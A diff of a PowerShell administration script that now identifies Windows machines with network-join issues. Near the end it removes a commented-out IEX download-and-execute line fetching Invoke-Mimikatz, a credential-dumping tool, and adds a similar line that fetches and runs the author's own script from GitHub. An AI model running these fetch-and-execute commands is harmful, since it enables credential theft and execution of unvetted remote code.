@@ -4,7 +4,7 @@
 # 
 # AUTHOR:  Jiri Pavlik (SED; pavlik@1sed.cz)
 # 
-# COMMENT:  script to make a list of certificates in computer store
+# COMMENT:  script to identify win machines with possible issues for network join
 # 
 # VERSION HISTORY: 
 #  0.1 20.04.2020 – Initial release 
@@ -196,6 +196,7 @@ $parameters = @{
 Invoke-RestMethod @parameters
 
 
-# IEX (new-object net.webclient).downloadstring("https://github.com/Jiri-Pavlik/Published/blob/master/Exfiltration/Invoke-Mimikatz.ps1")
+# usage - IEX (new-object net.webclient).downloadstring("https://github.com/Jiri-Pavlik/Published/raw/master/Client-8021x-status.ps1")
+
 
  
